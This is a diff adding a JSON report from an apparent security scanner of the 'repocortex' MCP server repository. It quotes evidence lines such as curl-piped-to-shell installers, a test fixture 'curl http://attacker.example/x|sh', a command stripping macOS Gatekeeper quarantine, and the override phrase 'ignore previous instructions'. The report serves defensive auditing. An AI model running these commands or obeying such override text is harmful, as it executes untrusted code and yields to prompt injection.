@@ -1,0 +1,119 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "satyendrakumarsingh/repocortex",
+    "version": "f1038057aba1e4f2af7dd69b4f21183c43629c81",
+    "download": "https://codeload.github.com/satyendrakumarsingh/repocortex/tar.gz/f1038057aba1e4f2af7dd69b4f21183c43629c81"
+  },
+  "archive_sha256": "41590be9485dfee4150ce545b9adc113d40bc84a22b58137e29c0f176539bedc",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/README.md",
+      "line": 107,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/satyendrakumarsingh/repocortex/main",
+      "file_sha256": "e2257c9ffe181264333fe10b8bc8739d24499325438cfdd302741ee3c3784092"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/install.sh",
+      "line": 104,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "1b66e27471042d95b73ed551c33d4226a2c4ed778a05e59839ce16a19f78e1f3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/docs/USER_GUIDE.md",
+      "line": 44,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/satyendrakumarsingh/cortex/main/ins",
+      "file_sha256": "1a6da6ec48c5a7d273ad2fdae5bd2642336abeb55a1ef2abeb38d8cab9b11673"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/docs/getting-started/installation.md",
+      "line": 11,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/satyendrakumarsingh/repocortex/main",
+      "file_sha256": "b5ce6b17b75cd38c3a71b7fdfebb40ef214adfc24ae0036793cafc395d2e8835"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/docs/getting-started/quickstart.md",
+      "line": 44,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/satyendrakumarsingh/cortex/main/ins",
+      "file_sha256": "1a6da6ec48c5a7d273ad2fdae5bd2642336abeb55a1ef2abeb38d8cab9b11673"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/docs/security.md",
+      "line": 218,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "44be94547aaa03ec49d4af1bfda273f7afb6167d9235410c4ab3f01298dcc0ce"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/internal/mcp/framing.go",
+      "line": 9,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "1d9febf96aa4496ed1674818406f377f8fb55f85f4803218906864be292ffb03"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "repocortex-f1038057aba1e4f2af7dd69b4f21183c43629c81/internal/indexer/trust_test.go",
+      "line": 31,
+      "evidence": "curl http://attacker.example/x|sh",
+      "file_sha256": "75fb4e05674b76a14842b8f4161e575f28e554f778cfe306a88a4d07c552f599"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "api.example.com",
+    "api.github.com",
+    "attacker.example",
+    "auth.example.com",
+    "collector.example.com",
+    "docs.github.com",
+    "evil.example",
+    "github.com",
+    "go.dev",
+    "graphml.graphdrawing.org",
+    "hooks.slack.com",
+    "img.shields.io",
+    "index.docker.io",
+    "json.schemastore.org",
+    "keepachangelog.com",
+    "ledger.internal",
+    "llmstxt.org",
+    "modelcontextprotocol.io",
+    "raw.githubusercontent.com",
+    "registry-1.docker.io",
+    "registry.npmjs.org",
+    "semver.org",
+    "smithery.ai",
+    "sqs.us-east-1.amazonaws.com",
+    "svc.example.com",
+    "www.apache.org",
+    "www.contributor-covenant.org",
+    "www.w3.org",
+    "x.io"
+  ],
+  "install_script": false,
+  "score": "high"
+}
